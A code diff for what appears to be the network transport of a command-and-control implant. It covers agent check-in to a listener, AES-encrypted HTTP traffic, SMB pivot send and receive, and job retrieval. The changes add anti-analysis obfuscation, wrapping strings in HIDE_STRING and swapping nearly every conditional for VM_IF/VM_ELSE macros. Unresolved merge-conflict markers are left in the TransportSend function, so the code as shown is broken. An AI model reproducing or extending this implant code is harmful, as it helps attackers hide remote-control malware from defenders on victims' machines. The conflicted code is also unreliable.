@@ -12,14 +12,14 @@
 
 BOOL TransportInit( )
 {
-    PUTS_DONT_SEND( "Connecting to listener" )
+    PUTS_DONT_SEND( HIDE_STRING("Connecting to listener") )
     PVOID  Data    = NULL;
     SIZE_T Size    = 0;
     BOOL   Success = FALSE;
 
     /* Sends to our connection (direct/pivot) */
 #ifdef TRANSPORT_HTTP
-    if ( PackageTransmitNow( Instance->MetaData, &Data, &Size ) )
+    VM_IF ( PackageTransmitNow( Instance->MetaData, &Data, &Size ) )
     {
         AESCTX AesCtx = { 0 };
 
@@ -27,9 +27,9 @@ BOOL TransportInit( )
         AesInit( &AesCtx, Instance->Config.AES.Key, Instance->Config.AES.IV );
         AesXCryptBuffer( &AesCtx, Data, Size );
 
-        if ( Data )
+        VM_IF ( Data )
         {
-            if ( ( UINT32 ) Instance->Session.AgentID == ( UINT32 ) DEREF( Data ) )
+            VM_IF ( ( UINT32 ) Instance->Session.AgentID == ( UINT32 ) DEREF( Data ) )
             {
                 Instance->Session.Connected = TRUE;
                 Success = TRUE;
@@ -39,7 +39,7 @@ BOOL TransportInit( )
 #endif
 
 #ifdef TRANSPORT_SMB
-    if ( PackageTransmitNow( Instance->MetaData, NULL, NULL ) == TRUE )
+    VM_IF ( PackageTransmitNow( Instance->MetaData, NULL, NULL ) == TRUE )
     {
         Instance->Session.Connected = TRUE;
         Success = TRUE;
@@ -59,12 +59,20 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
 
 #ifdef TRANSPORT_HTTP
 
-    if ( HttpSend( &Send, &Resp ) )
+    VM_IF ( HttpSend( &Send, &Resp ) )
     {
+<<<<<<< Updated upstream
         if ( RecvData )
             *RecvData = Resp.Buffer;
+=======
+        VM_IF ( RecvData ) {
+            *RecvData = Resp.Buffer;
+        } VM_ELSE {
+            Instance->Win32.LocalFree( Resp.Buffer );
+        }
+>>>>>>> Stashed changes
 
-        if ( RecvSize )
+        VM_IF ( RecvSize )
             *RecvSize = Resp.Length;
 
         return TRUE;
@@ -74,7 +82,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
 
 #ifdef TRANSPORT_SMB
 
-    if ( SmbSend( &Send ) )
+    VM_IF ( SmbSend( &Send ) )
     {
         return TRUE;
     }
@@ -90,18 +98,18 @@ BOOL SMBGetJob( PVOID* RecvData, PSIZE_T RecvSize )
 {
     BUFFER Resp = { 0 };
 
-    if ( RecvData )
+    VM_IF ( RecvData )
         *RecvData = NULL;
 
-    if ( RecvSize )
+    VM_IF ( RecvSize )
         *RecvSize = 0;
 
-    if ( SmbRecv( &Resp ) )
+    VM_IF ( SmbRecv( &Resp ) )
     {
-        if ( RecvData )
+        VM_IF ( RecvData )
             *RecvData = Resp.Buffer;
 
-        if ( RecvSize )
+        VM_IF ( RecvSize )
             *RecvSize = Resp.Length;
 
         return TRUE;
